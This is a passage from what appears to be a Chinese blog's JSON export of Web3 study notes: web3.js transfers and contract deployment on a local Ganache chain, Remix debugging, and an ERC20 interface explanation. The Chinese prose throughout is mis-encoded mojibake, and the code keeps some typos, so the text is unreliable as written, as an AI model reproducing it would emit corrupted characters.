from: &quot;0x3C061FCEb96fca484e8c55C204BAd35C6fE2CE0f&quot;, to: &quot;0x2DeF5505E8EfaD8dF16eFE1dFd8a49f52360b2e8&quot;, value: web.utils.toWei(&#x27;1&#x27;,&#x27;ether&#x27;), data: &#x27;&#x27;&#125;web.eth.sendTransacation(transactionObject).then(console.log); from (æœ¬åœ°è´¦æˆ·)ï¼š to (é’±åŒ…åœ°å€)ï¼š ä½†æ˜¯æŠ¥é”™äº†ï¼Œå¦‚ä¸‹ï¼š å†å›å»çœ‹è§†é¢‘ï¼Œæ‰“å¼€å¼¹å¹•ï¼Œç›´æ¥ç‹ ç‹ æ„Ÿè°¢å¼¹å¹•è€å“¥ï¼ï¼ï¼ï¼ æ­£ç¡®ä»£ç ï¼šå°† data å­—æ®µåˆ æ‰ï¼Œæˆ–è€…æ³¨é‡Šæ‰ 12345678910111213let Web3 = require(&quot;web3&quot;);web = new Web3(new Web3.providers.HttpProvider(&quot;Http://127.0.0.1:7545&quot;));// web.eth.getBlock(&quot;latest&quot;,true).then(console.log);var transactionObject = &#123; from: &quot;0x3C061FCEb96fca484e8c55C204BAd35C6fE2CE0f&quot;, to: &quot;0x2DeF5505E8EfaD8dF16eFE1dFd8a49f52360b2e8&quot;, value: web.utils.toWei(&#x27;1&#x27;,&#x27;ether&#x27;), // data: &#x27;&#x27;&#125;web.eth.sendTransaction(transactionObject).then(console.log); ä»£ç æ­£å¸¸è¿è¡Œï¼š åˆ°æˆ‘çš„é’±åŒ…å»æŸ¥çœ‹ä½™é¢ï¼Œå‘ç°è½¬è´¦æˆåŠŸï¼š 12.3.2 æŸ¥è¯¢äº¤æ˜“ä¿¡æ¯ â€” web3.eth.getTransaction() 12.3.3 æŸ¥è¯¢äº¤æ˜“æ”¶æ®ï¼ˆè¿›åŒºå—æ•°æ®ï¼‰ â€“ web3.eth.getTransactionReceipt() 13. web3.js åˆçº¦äº¤äº’ â€” æœ€æƒ³å­¦çš„åœ°æ–¹13.1 åº”ç”¨ç¨‹åºäºŒè¿›åˆ¶æ¥å£(ABI)13.1.1 ABI ç®€ä»‹ 13.1.2 ABI èŒƒä¾‹ 13.1.3 ABIè¡¨ç°å½¢å¼ä¸¾ä¾‹ 13.1.4 ABI çš„ä½œç”¨ 13.2 åˆ›å»ºåˆçº¦13.2.1 å‡†å¤‡æ™ºèƒ½åˆçº¦ MyContract.sol: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract MyContract &#123; //çŠ¶æ€å˜é‡ string storageVaule; //public çš„çŠ¶æ€å˜é‡ string public name; // æ„é€ å‡½æ•° constructor() public &#123; storageVaule = &quot;biyou&quot;; &#125; // ç»“æ„ä½“ struct Student &#123; string name; int age; &#125; // ä¿®æ”¹çŠ¶æ€å˜é‡ function setStorageValue(string memory str) public &#123; storageVaule = str; &#125; function getStorageValue() public view returns(string memory) &#123; return storageVaule; &#125; // å¯ä»¥å‘å¸çš„å‡½æ•° function setMoney() public payable &#123; &#125; // äº‹ä»¶ event myEvent (string name); function emitEvent(string memory name) public returns(string memory) &#123; emit myEvent(name); return strConcat(&quot;hello&quot;,name); &#125; function strConcat(string memory _a, string memory _b) internal pure returns(string memory) &#123; bytes memory _ba = bytes(_a); bytes memory _bb = bytes(_b); string memory ret = new string(_ba.length + _bb.length); bytes memory bret = bytes(ret); uint k = 0; for (uint i = 0; i &lt; _ba.length; i++) bret[k++] = _ba[i]; for (uint i = 0; i &lt; _bb.length; i++) bret[k++] = _bb[i]; return string(ret); &#125;&#125; 13.2.2 ç›´æ¥ä½¿ç”¨jsåœ¨åŒºå—é“¾ä¸Šéƒ¨ç½²ä¸€ä¸ªæ–°çš„æ™ºèƒ½åˆçº¦ï¼ˆï¼ï¼ï¼éš¾ç‚¹ï¼‰ æµ‹è¯•ä»£ç ï¼š 1234567891011121314151617181920212223let Web3 = require(&quot;web3&quot;);web = new Web3(new Web3.providers.HttpProvider(&quot;Http://127.0.0.1:7545&quot;));// fs æ¨¡å—è¯»å–.solåˆçº¦æ–‡ä»¶var fs = require(&quot;fs&quot;);var myContractABI = JSON.parse(fs.readFileSync(&quot;D:\\\\VSCode\\\\VSCode_Data\\\\Web3Workspace\\\\js\\\\lesson_online\\\\MyContract.abi&quot;),toString());var myContract = new web.eth.Contract(myContractABI);var data = &quot;0x608060405234801561001057600080fd5b506040518060400160405280600581526020017f6269796f750000000000000000000000000000000000000000000000000000008152506000908051906020019061005c929190610062565b50610166565b82805461006e90610105565b90600052602060002090601f01602090048101928261009057600085556100d7565b82601f106100a957805160ff19168380011785556100d7565b828001600101855582156100d7579182015b828111156100d65782518255916020019190600101906100bb565b5b5090506100e491906100e8565b5090565b5b808211156101015760008160009055506001016100e9565b5090565b6000600282049050600182168061011d57607f821691505b6020821081141561013157610130610137565b5b50919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052602260045260246000fd5b61095f806101756000396000f3fe60806040526004361061004a5760003560e01c806306fdde031461004f57806344e649b71461007a57806390ad7f5414610084578063982296a8146100af578063ec6070f6146100ec575b600080fd5b34801561005b57600080fd5b50610064610115565b60405161007191906106a9565b60405180910390f35b6100826101a3565b005b34801561009057600080fd5b506100996101a5565b6040516100a691906106a9565b60405180910390f35b3480156100bb57600080fd5b506100d660048036038101906100d1919061062f565b610237565b6040516100e391906106a9565b60405180910390f35b3480156100f857600080fd5b50610113600480360381019061010e919061062f565b6102b6565b005b60018054610122906107df565b80601f016020809104026020016040519081016040528092919081815260200182805461014e906107df565b801561019b5780601f106101705761010080835404028352916020019161019b565b820191906000526020600020905b81548152906001019060200180831161017e57829003601f168201915b505050505081565b565b6060600080546101b4906107df565b80601f01602080910402602001604051908101604052809291908181526020018280546101e0906107df565b801561022d5780601f106102025761010080835404028352916020019161022d565b820191906000526020600020905b81548152906001019060200180831161021057829003601f168201915b5050505050905090565b60607f52b54003f649c6d5ca97ae2b169c38f3c257eb14026ad745b11808153cdfd1528260405161026891906106a9565b60405180910390a16102af6040518060400160405280600581526020017f68656c6c6f000000000000000000000000000000000000000000000000000000815250836102d0565b9050919050565b80600090805190602001906102cc929190610524565b5050565b6060600083905060008390506000815183516102ec919061073d565b67ffffffffffffffff81111561032b577f4e487b7100000000000000000000000000000000000000000000000000000000600052604160045260246000fd5b6040519080825280601f01601f19166020018201604052801561035d5781602001600182028036833780820191505090505b50905060008190506000805b855181101561043d578581815181106103ab577f4e487b7100000000000000000000000000000000000000000000000000000000600052603260045260246000fd5b602001015160f81c60f81b8383806103c290610842565b9450815181106103fb577f4e487b7100000000000000000000000000000000000000000000000000000000600052603260045260246000fd5b60200101907effffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916908160001a905350808061043590610842565b915050610369565b5060005b845181101561051557848181518110610483577f4e487b7100000000000000000000000000000000000000000000000000000000600052603260045260246000fd5b602001015160f81c60f81b83838061049a90610842565b9450815181106104d3577f4e487b7100000000000000000000000000000000000000000000000000000000600052603260045260246000fd5b60200101907effffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916908160001a905350808061050d90610842565b915050610441565b50829550505050505092915050565b828054610530906107df565b90600052602060002090601f0160209004810192826105525760008555610599565b82601f1061056b57805160ff1916838001178555610599565b82800160010185558215610599579182015b8281111561059857825182559160200191906001019061057d565b5b5090506105a691906105aa565b5090565b5b808211156105c35760008160009055506001016105ab565b5090565b60006105da6105d5846106f0565b6106cb565b9050828152602081018484840111156105f257600080fd5b6105fd84828561079d565b509392505050565b600082601f83011261061657600080fd5b81356106268482602086016105c7565b91505092915050565b60006020828403121561064157600080fd5b600082013567ffffffffffffffff81111561065b57600080fd5b61066784828501610605565b91505092915050565b600061067b82610721565b610685818561072c565b93506106958185602086016107ac565b61069e81610918565b840191505092915050565b600060208201905081810360008301526106c38184610670565b905092915050565b60006106d56106e6565b90506106e18282610811565b919050565b6000604051905090565b600067ffffffffffffffff82111561070b5761070a6108e9565b5b61071482610918565b9050602081019050919050565b600081519050919050565b600082825260208201905092915050565b600061074882610793565b915061075383610793565b9250827fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff038211156107885761078761088b565b5b828201905092915050565b6000819050919050565b82818337600083830152505050565b60005b838110156107ca5780820151818401526020810190506107af565b838111156107d9576000848401525b50505050565b600060028204905060018216806107f757607f821691505b6020821081141561080b5761080a6108ba565b5b50919050565b61081a82610918565b810181811067ffffffffffffffff82111715610839576108386108e9565b5b80604052505050565b600061084d82610793565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff8214156108805761087f61088b565b5b600182019050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b7f4e487b7100000000000000000000000000000000000000000000000000000000600052602260045260246000fd5b7f4e487b7100000000000000000000000000000000000000000000000000000000600052604160045260246000fd5b6000601f19601f830116905091905056fea2646970667358221220f839dcd300d8752d974808215c924e8e08a1d6556227d4be2b3c89805e41a38764736f6c63430008020033&quot;;myContract.deploy(&#123; data: data&#125;).send(&#123; from: &quot;0x3C061FCEb96fca484e8c55C204BAd35C6fE2CE0f&quot;, gas: 1500000, gasPrice: &#x27;1000000&#x27;&#125;,function(error,result)&#123; console.log(result)&#125;)// var contractAddress = &quot;&quot;;// var myContract = new web.eth.Contract(myContractABI,contractAddress); æŠ¥é”™ï¼š åŸå› ï¼š\\ æ˜¯ä¸€ä¸ªç‰¹æ®Šå­—ç¬¦ï¼Œå³è½¬ä¹‰å­—ç¬¦ï¼Œéœ€è¦ \\\\ è¿™æ ·è¡¨ç¤ºä¸€ä¸ª \\ æ‰§è¡Œç»“æœï¼š è¿™ä¸ªç»“æœæ˜¯ä¸æ­£ç¡®çš„ï¼Œæ²¡æœ‰ç»™æˆ‘ä»¬è¿”å›ä¸€ä¸ªåœ°å€ï¼Œè§£å†³åŠæ³•æ˜¯ï¼š å°† gasPrice å­—æ®µæ³¨é‡Šæ‰ï¼Œ å¦‚ // gasPrice: &#39;1000000&#39; å†æ¬¡æ‰§è¡Œå…¶ç»“æœä¸ºï¼š â‘  data æ¥æºï¼ˆéœ€è¦åœ¨å‰é¢åŠ ä¸€ä¸ª0xï¼‰ï¼š å¯ä»¥åœ¨ Ganache ä¸Šé¢æŸ¥åˆ° åœ¨vscode éƒ¨ç½²çš„åˆçº¦åœ°å€ï¼š ç”¨è¿™ä¸ªåˆçº¦åœ°å€åˆ°ï¼Œremix ä¸ŠéªŒè¯ä¸€ä¸‹ï¼š 13.3 è°ƒç”¨åˆçº¦å‡½æ•°13.3.1 è°ƒç”¨æ™ºèƒ½åˆçº¦è¯»å‡½æ•° ä»£ç ï¼š 1234567891011121314let Web3 = require(&quot;web3&quot;);web = new Web3(new Web3.providers.HttpProvider(&quot;Http://127.0.0.1:7545&quot;));// fs æ¨¡å—è¯»å–.solåˆçº¦æ–‡ä»¶var fs = require(&quot;fs&quot;);var myContractABI = JSON.parse(fs.readFileSync(&quot;D:\\\\VSCode\\\\VSCode_Data\\\\Web3Workspace\\\\js\\\\lesson_online\\\\MyContract.abi&quot;),toString());var myContract = new web.eth.Contract(myContractABI);var contractAddress = &quot;0x4c8BbD5829Bdcb9C9b11Ec3D5556cC77541FFB2e&quot;;var myContract = new web.eth.Contract(myContractABI,contractAddress);myContract.methods.getStorageValue().call((err,result)=&gt;&#123; console.log(result);&#125;); ç»“æœï¼š 13.3.2 è°ƒç”¨æ™ºèƒ½åˆçº¦å†™å‡½æ•° ä»£ç ï¼š 12345678910111213141516171819let Web3 = require(&quot;web3&quot;);web = new Web3(new Web3.providers.HttpProvider(&quot;Http://127.0.0.1:7545&quot;));// fs æ¨¡å—è¯»å–.solåˆçº¦æ–‡ä»¶var fs = require(&quot;fs&quot;);var myContractABI = JSON.parse(fs.readFileSync(&quot;D:\\\\VSCode\\\\VSCode_Data\\\\Web3Workspace\\\\js\\\\lesson_online\\\\MyContract.abi&quot;),toString());var myContract = new web.eth.Contract(myContractABI);var contractAddress = &quot;0x4c8BbD5829Bdcb9C9b11Ec3D5556cC77541FFB2e&quot;;var myContract = new web.eth.Contract(myContractABI,contractAddress);myContract.methods.setStorageValue(&quot;new message&quot;).send(&#123; from: &quot;0x3C061FCEb96fca484e8c55C204BAd35C6fE2CE0f&quot;&#125;).on(&quot;receipt&quot;, function(result)&#123; console.log(result); myContract.methods.getStorageValue().call((err,result)=&gt;&#123; console.log(result); &#125;);&#125;); 13.4 è°ƒç”¨åˆçº¦äº‹ä»¶13.4.1 åˆçº¦äº‹ä»¶ç›‘å¬ 13.4.2 æ‰§è¡Œäº‹ä»¶æŸ¥è¯¢ 14. ç®€å•çš„DApp â€“ æŠ•ç¥¨ç³»ç»Ÿ","categories":[{"name":"Web3","slug":"Web3","permalink":"https://biyouqiuqiu.com/categories/Web3/"},{"name":"Basic_Knowledge","slug":"Web3/Basic-Knowledge","permalink":"https://biyouqiuqiu.com/categories/Web3/Basic-Knowledge/"}],"tags":[{"name":"Web3","slug":"Web3","permalink":"https://biyouqiuqiu.com/tags/Web3/"}]},{"title":"Remix-debugçš„ä½¿ç”¨","slug":"Solidity/Basic_Knowledge/Remix-debugçš„ä½¿ç”¨","date":"2023-03-31T06:47:10.000Z","updated":"2023-03-31T06:47:10.000Z","comments":true,"path":"2023/03/31/Solidity/Basic_Knowledge/Remix-debugçš„ä½¿ç”¨/","link":"","permalink":"https://biyouqiuqiu.com/2023/03/31/Solidity/Basic_Knowledge/Remix-debug%E7%9A%84%E4%BD%BF%E7%94%A8/","excerpt":"","text":"Remix-debugçš„ä½¿ç”¨å‚è€ƒåšå®¢å®˜æ–¹æ–‡æ¡£1å®˜æ–¹æ–‡æ¡£21. å‚è€ƒåšå®¢ä¸­è·å–çš„æµ‹è¯•ä»£ç ï¼š1234567891011121314151617181920212223// SPDX-License-Identifier: MITpragma solidity ^0.8.4;contract Debugging &#123; uint256 counter; constructor(uint256 _counter) &#123; counter = _counter; &#125; function _setCounter(uint256 _counter) internal &#123; counter = _counter; &#125; function increment(uint256 value) public &#123; uint256 newValue = counter + value; _setCounter(newValue); &#125; function decrement(uint256 value) public &#123; uint256 newValue = counter - value; _setCounter(newValue); &#125; function getCounter() public view returns(uint256) &#123; return counter; &#125;&#125; 2. ç¼–è¯‘éƒ¨ç½² 3. è°ƒç”¨ increment å‡½æ•° 4. è°ƒè¯•æ™ºèƒ½åˆçº¦ 4.1 å…ˆæ‰¾åˆ°äº¤æ˜“çš„hashå€¼ï¼š0xe19af7a3be310b85ccfb9538ef16314a575f395aae3787f71f897b4845547885 4.2 å°†äº¤æ˜“çš„å“ˆå¸Œå¡«å…¥ï¼Œdebug çš„å‚æ•°æ¡†å†…ï¼Œç‚¹å‡» Start debugging 4.3 äº†è§£å„ä¸ªæŒ‰é’®çš„æ„æ€ â‘  è¿”å›åˆ°ä¸Šä¸€ä¸ªæ­¥éª¤ã€‚å‡½æ•°è°ƒç”¨å°†è¢«å¿½ç•¥ï¼Œè°ƒè¯•å™¨å°†ä¸è¿›å…¥è¯¥å‡½æ•°ã€‚ â‘¡ åé€€ä¸€æ­¥å›åˆ°ä¸Šä¸€æ­¥ã€‚å‡½æ•°ä¸ä¼šè¢«å¿½ç•¥ï¼Œè°ƒè¯•å™¨å°†è¿›å…¥è¯¥å‡½æ•°ã€‚ â‘¢ Step intoè¿›å…¥ä¸‹ä¸€æ­¥ï¼Œå¦‚æœæœ‰å‡½æ•°è°ƒç”¨ï¼Œè°ƒè¯•å™¨å°†è¿›å…¥å‡½æ•°ã€‚ â‘£ è·¨æ­¥å‰è¿›è¿›å…¥ä¸‹ä¸€æ­¥ï¼Œä½†æ˜¯å‡½æ•°è°ƒç”¨å°†è¢«å¿½ç•¥ï¼Œè°ƒè¯•å™¨ä¸ä¼šè¿›å…¥å‡½æ•°ã€‚ â‘¤ è·³åˆ°ä¸Šä¸€ä¸ªæ–­ç‚¹ï¼Œä½¿è°ƒè¯•å™¨è¿›å…¥æœ€åè®¿é—®çš„æ–­ç‚¹ã€‚å¯ä»¥é€šè¿‡ç‚¹å‡»ä»£ç çš„è¡Œå·æ¥è®¾ç½®æ–­ç‚¹ â‘¥ è·³å‡ºå°†è°ƒè¯•å™¨å¸¦åˆ°å‡½æ•°çš„æœ«ç«¯ â‘¦ è·³åˆ°ä¸‹ä¸€ä¸ªæ–­ç‚¹ä¼šä½¿è°ƒè¯•å™¨è·³åˆ°ç¼–è¾‘å™¨ä¸­çš„ä¸‹ä¸€ä¸ªè®¾å®šçš„æ–­ç‚¹ã€‚ è¿˜æœ‰ä¸€ä¸ªæ˜¯æ»‘å—ï¼Œç±»ä¼¼äºè¿›åº¦æ¡ 4.4 åˆšå¼€å§‹è°ƒè¯•çš„æ—¶å€™ï¼Œincrement() å‡½æ•°ä½“ä¸­çš„æŸäº›å˜é‡æ˜¯é«˜äº®çš„ï¼Œæ¯”å¦‚newValue è¿™ä¸ªå˜é‡æ­£åœ¨è¢«åˆ›å»ºã€‚ä¸€ç›´å¾€ä¸‹è°ƒè¯•çš„æ—¶å€™ï¼Œcounter å’Œ value çš„ä¹Ÿä¼šé«˜äº®æ˜¾ç¤ºï¼Œæ¨¡æ‹Ÿäº†åŠ æ³•çš„å·¥ä½œæƒ…å†µ 4.5 æœ€ç»ˆï¼Œåœ¨åå‡ æ­¥ï¼Œ Solidity Locals é¢æ¿ä¸Šè¿™æ ·æ˜¾ç¤º è¿™æ„å‘³ç€ newValue å½“å‰çš„å€¼æ˜¯520ã€‚å†ç»§ç»­å¾€åèµ°, _setCounter å‡½æ•°å°†ä¼šé«˜äº®ï¼Œæ„å‘³ç€ æ§åˆ¶è¢«ä¼ é€’åˆ°å†…éƒ¨å‡½æ•° _setCounter ï¼Œæ­¤æ—¶ debug å°†ä¸èƒ½ç»§ç»­å¾€ä¸‹èµ°äº†ï¼Œè¡¨ç¤ºè¯¥æ–¹æ³•å·²ç»è¿è¡Œå®Œæˆ 4.6 å¯ä»¥è§‚å¯Ÿåˆ° Solidity State ä¸­çš„ counter çš„å€¼å·²ç»å‘ç”Ÿäº†æ›´æ–° 5. å…¶ä»–è°ƒè¯•åŠŸèƒ½5.1 å‡½æ•°æ ˆ è¿™ä¸ªé¢æ¿å¯ä»¥å¾—åˆ°å¾ˆå¤šä¿¡æ¯ï¼Œæ¯”å¦‚å“ªä¸ªå‡½æ•°ç›®å‰æ­£åœ¨æ‰§è¡Œï¼Œå“ªä¸ªå‡½æ•°è°ƒç”¨äº†å®ƒã€‚å¦‚æœæœ‰å¤šä¸ªå‡½æ•°ï¼Œå®ƒå°†ä»¥å †æ ˆçš„å½¢å¼æ˜¾ç¤ºã€‚ 5.2 å…¨å±€å˜é‡ å¯ä»¥è·Ÿè¸ªäº¤æ˜“ä¸­çš„å…¨å±€å˜é‡ï¼Œä»¥å¤‡ä½ éœ€è¦çŸ¥é“äº¤æ˜“ä¸­çš„å‘ä»¶äººæˆ–å…¶ä»–æ•°æ® 5.3 æ­¥éª¤ç»†èŠ‚ å¯ä»¥å¾—åˆ°ä¸€äº›é¢å¤–çš„æ­¥éª¤æ•°æ®ï¼Œå¦‚å·²ä½¿ç”¨çš„gas å’Œ å‰©ä½™çš„ gas 5.4 æ“ä½œç  ä½¿ç”¨æ“ä½œç ï¼Œå¯ä»¥å¾—åˆ°å…³äºåˆåŒå½“å‰æ­¥éª¤çš„é«˜çº§ä¿¡æ¯ã€‚ä½ å¯ä»¥äº†è§£ç¨‹åºä½•æ—¶æ‰§è¡Œæ­¥éª¤ï¼Œå¦‚ JUMP ï¼ˆï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼‰ã€‚ å†…å¿ƒï¼šæ­¤æ—¶çš„æˆ‘å†…å¿ƒè¿˜æ˜¯å¾ˆæ‡µé€¼çš„ï¼Œé“ç†éƒ½æ‡‚ï¼Œä½†æ˜¯å…¶ä¸­çš„ç»†èŠ‚è¿˜æ˜¯ä¸æ‡‚ï¼Œä¸ºä»€ä¹ˆä¸‹ä¸€æ­¥å¯ä»¥ç‚¹é‚£ä¹ˆé‚£ä¹ˆå¤šä¸‹ï¼Œä¹‹å‰å­¦ Java çš„æ—¶å€™ï¼Œä½¿ç”¨ Idea debugè°ƒè¯•ä»£ç ï¼Œå¥½åƒéƒ½ä¸éœ€è¦ç‚¹è¿™ä¹ˆå¤šä¸‹ï¼Œå¯èƒ½å¾—å¤šç”¨å§ï¼Œå¤šç»ƒå¤šç”¨","categories":[{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/categories/Solidity/"},{"name":"Utils","slug":"Solidity/Utils","permalink":"https://biyouqiuqiu.com/categories/Solidity/Utils/"}],"tags":[{"name":"solidity","slug":"solidity","permalink":"https://biyouqiuqiu.com/tags/solidity/"},{"name":"Remix-debug","slug":"Remix-debug","permalink":"https://biyouqiuqiu.com/tags/Remix-debug/"}]},{"title":"ERC20çš„ç†è§£","slug":"Solidity/Basic_Knowledge/ERC20çš„ç†è§£","date":"2023-03-30T22:47:10.000Z","updated":"2023-03-30T22:47:10.000Z","comments":true,"path":"2023/03/31/Solidity/Basic_Knowledge/ERC20çš„ç†è§£/","link":"","permalink":"https://biyouqiuqiu.com/2023/03/31/Solidity/Basic_Knowledge/ERC20%E7%9A%84%E7%90%86%E8%A7%A3/","excerpt":"","text":"ERC20çš„ç†è§£çŸ¥è¯†æ¥æºï¼š æ–‡ç« ä¸€ æ–‡ç« äºŒ æ–‡ç« ä¸‰ å®˜æ–¹æ–‡æ¡£ 1. æ–‡ç« ä¸€çš„è§£è¯»ï¼š1. 1 ERC20ERC20 æ˜¯ä»¥å¤ªåŠä¸Šçš„ä»£å¸æ ‡å‡†ï¼Œæ¥è‡ª EIP20 ã€‚å®ƒå®ç°äº†ä»£å¸è½¬è´¦çš„åŸºæœ¬é€»è¾‘ï¼š è´¦æˆ·ä½™é¢ è½¬è´¦ æˆæƒè½¬è´¦ ä»£å¸æ€»ä¾›ç»™ ä»£å¸ä¿¡æ¯(å¯é€‰)ï¼šåç§°ï¼Œä»£å·ï¼Œå°æ•°ä½æ•° 1.2 IERC20IERC20 æ˜¯ ERC20 ä»£å¸æ ‡å‡†çš„æ¥å£åˆçº¦ï¼Œè§„å®šäº†ERC20 ä»£å¸éœ€è¦å®ä¹ çš„å‡½æ•°å’Œäº‹ä»¶ã€‚ä¹‹æ‰€ä»¥éœ€è¦å®šä¹‰æ¥å£ï¼Œæ˜¯å› ä¸ºæœ‰äº†è§„èŒƒåï¼Œå°±å­˜åœ¨æ‰€æœ‰çš„ ERC20 ä»£å¸éƒ½é€šç”¨çš„å‡½æ•°åç§°ï¼Œè¾“å…¥å‚æ•°ï¼Œè¾“å‡ºå‚æ•°ã€‚åœ¨æ¥å£å‡½æ•°ä¸­ï¼Œåªéœ€è¦å®šä¹‰å‡½æ•°åç§°ï¼Œè¾“å…¥å‚æ•°ï¼Œè¾“å‡ºå‚æ•°ï¼Œå¹¶ä¸å…³å¿ƒå‡½æ•°å†…éƒ¨å¦‚ä½•å®ç°ã€‚ç”±æ­¤ï¼Œå‡½æ•°å°±åˆ†ä¸ºå†…éƒ¨å’Œå¤–éƒ¨ä¸¤ä¸ªå†…å®¹ï¼Œä¸€ä¸ªé‡ç‚¹æ˜¯å®ç°ï¼Œå¦ä¸€ä¸ªæ˜¯å¯¹å¤–æ¥å£ï¼Œçº¦å®šå…¬å…±æ•°æ®ã€‚è¿™å°±æ˜¯ä¸ºä»€ä¹ˆéœ€è¦ERC20ã€‚sol å’Œ IERC20.sol ä¸¤ä¸ªæ–‡ä»¶å®ç°ä¸€ä¸ªåˆçº¦ã€‚ 1.2.1 äº‹ä»¶IERC20 å®šä¹‰äº† 2 ä¸ªäº‹ä»¶ï¼šTransfer äº‹ä»¶ å’Œ Approval äº‹ä»¶ï¼Œåˆ†åˆ«åœ¨è½¬è´¦æ—¶è¢«é‡Šæ”¾ 123456789/** * @dev é‡Šæ”¾æ¡ä»¶ï¼šå½“ `value` å•ä½çš„è´§å¸ä»è´¦æˆ· (`from`) è½¬è´¦åˆ°å¦ä¸€è´¦æˆ· (`to`)æ—¶. */event Transfer(address indexed from, address indexed to, uint256 value);/** * @dev é‡Šæ”¾æ¡ä»¶ï¼šå½“ `value` å•ä½çš„è´§å¸ä»è´¦æˆ· (`owner`) æˆæƒç»™å¦ä¸€è´¦æˆ· (`spender`)æ—¶. */event Approval(address indexed owner, address indexed spender, uint256 value); 1.2.2 å‡½æ•°IERC20 å®šä¹‰äº† 6 ä¸ªå‡½æ•°ï¼Œæä¾›äº†è½¬ç§»ä»£å¸çš„åŸºæœ¬åŠŸèƒ½ï¼Œå¹¶å…è®¸ä»£å¸è·å¾—æ‰¹å‡†ï¼Œä»¥ä¾¿å…¶ä»–é“¾ä¸Šç¬¬ä¸‰æ–¹ä½¿ç”¨ã€‚ totalSupply() è¿”å›ä»£å¸æ€»ä¾›ç»™ 1234/** * @dev è¿”å›ä»£å¸æ€»ä¾›ç»™. */function totalSupply() external view returns (uint256); balanceOf() è¿”å›è´¦æˆ·ä½™é¢ 1234/** * @dev è¿”å›è´¦æˆ·`account`æ‰€æŒæœ‰çš„ä»£å¸æ•°. */function balanceOf(address account) external view returns (uint256); transfer() è½¬è´¦ 12345678/** * @dev è½¬è´¦ `amount` å•ä½ä»£å¸ï¼Œä»è°ƒç”¨è€…è´¦æˆ·åˆ°å¦ä¸€è´¦æˆ· `to`. * * å¦‚æœæˆåŠŸï¼Œè¿”å› `true`. * * é‡Šæ”¾ &#123;Transfer&#125; äº‹ä»¶. */function transfer(address to, uint256 amount) external returns (bool); allowance() è¿”å›æˆæƒé¢åº¦ 123456/** * @dev è¿”å›`owner`è´¦æˆ·æˆæƒç»™`spender`è´¦æˆ·çš„é¢åº¦ï¼Œé»˜è®¤ä¸º0ã€‚ * * å½“&#123;approve&#125; æˆ– &#123;transferFrom&#125; è¢«è°ƒç”¨æ—¶ï¼Œ`allowance`ä¼šæ”¹å˜. */function allowance(address owner, address spender) external view returns (uint256); approve() æˆæƒ 12345678/** * @dev è°ƒç”¨è€…è´¦æˆ·ç»™`spender`è´¦æˆ·æˆæƒ `amount`æ•°é‡ä»£å¸ã€‚ * * å¦‚æœæˆåŠŸï¼Œè¿”å› `true`. * * é‡Šæ”¾ &#123;Approval&#125; äº‹ä»¶. */function approve(address spender, uint256 amount) external returns (bool); tranferFrom() æˆæƒè½¬è´¦ 123456789101112/** * @dev é€šè¿‡æˆæƒæœºåˆ¶ï¼Œä»`from`è´¦æˆ·å‘`to`è´¦æˆ·è½¬è´¦`amount`æ•°é‡ä»£å¸ã€‚è½¬è´¦çš„éƒ¨åˆ†ä¼šä»è°ƒç”¨è€…çš„`allowance`ä¸­æ‰£é™¤ã€‚ * * å¦‚æœæˆåŠŸï¼Œè¿”å› `true`. * * é‡Šæ”¾ &#123;Transfer&#125; äº‹ä»¶. */function transferFrom( address from, address to, uint256 amount) external returns (bool); 1.3 å®ç°ERC20â€‹ è‡ªå·±ç¼–å†™ä¸€ä¸ªERC20, å°†IERC20 è§„å®šçš„å‡½æ•°ç®€å•çš„å®ç°ã€‚ 1.3.1 çŠ¶æ€å˜é‡æˆ‘ä»¬éœ€è¦çŠ¶æ€å˜é‡æ¥è®°å½•è´¦æˆ·ä½™é¢ï¼Œæˆæƒé¢åº¦å’Œä»£å¸ä¿¡æ¯ã€‚å…¶ä¸­balanceOfï¼Œallowance å’Œ totalSupply ä¸ºpublic ç±»å‹ï¼Œ ä¼šè‡ªåŠ¨ç”Ÿæˆä¸€ä¸ªåŒåçš„getter å‡½æ•°ï¼Œå®ç° IERC20 è§„å®šçš„ balanceOf() ï¼Œ allowance() å’Œ totalSupply() ã€‚è€Œ nameï¼Œsymbolï¼Œdecimals åˆ™å¯¹åº”ä»£å¸çš„åç§°ï¼Œä»£å·å’Œå°æ•°ä½æ•°ã€‚ æ³¨æ„ï¼šç”¨ overrideä¿®é¥° publicå˜é‡ï¼Œä¼šé‡å†™ç»§æ‰¿çˆ¶åˆçº¦çš„ä¸å˜é‡ååŒåçš„getterå‡½æ•°ï¼Œæ¯”å¦‚ IERC20ä¸­çš„ balanceOfï¼ˆï¼‰ å‡½æ•° 12345678910mapping(address =&gt; uint256) public override balanceOf;mapping(address =&gt; mapping(address =&gt; uint256)) public override allowance;uint256 public override totalSupply; // ä»£å¸æ€»ä¾›ç»™string public name; // åç§°string public symbol; // ä»£å·uint8 public decimals = 18; // å°æ•°ä½æ•° è§£è¯»ï¼šåµŒå¥—æ˜ å°„ mapping(address =&gt; mapping(address =&gt; uint256)) public override allowance; æˆ‘çš„ç†è§£æ˜¯å…ˆæ‰§è¡Œå†…å±‚çš„ mapping æ˜ å°„ï¼Œå¾—åˆ°å†…å±‚ address åœ°å€ï¼Œå¯¹åº”çš„ uint256 çš„å€¼ï¼Œç„¶åå†æ‰§è¡Œå¤–å±‚ mapping å¤–å±‚çš„address å¯¹åº”äº†å†…å±‚ address æ˜ å°„å‡ºçš„å€¼ï¼Œæœ‰ç‚¹åƒ Java é‡Œçš„é”®å€¼å¯¹ï¼Œä¸¤ä¸ªaddress å”¯ä¸€ç¡®å®šä¸€ä¸ªuint256ï¼Ÿæˆ‘ç›®å‰çš„ç†è§£æ˜¯è¿™æ ·ï¼Œæ—¥åç­‰æˆ‘çŸ¥è¯†å‚¨å¤‡å¤šä¸€ç‚¹æˆ‘å†æ¥è§£å†³è¿™é‡Œçš„ç–‘æƒ‘ 1.3.2 å‡½æ•° æ„é€ å‡½æ•°ï¼šåˆå§‹åŒ–ä»£å¸åç§°ã€ä»£å·ã€‚ 1234constructor(string memory name_, string memory symbol_)&#123; name = name_; symbol = symbol_;&#125; transfer() å‡½æ•°ï¼šå®ç° IERC20 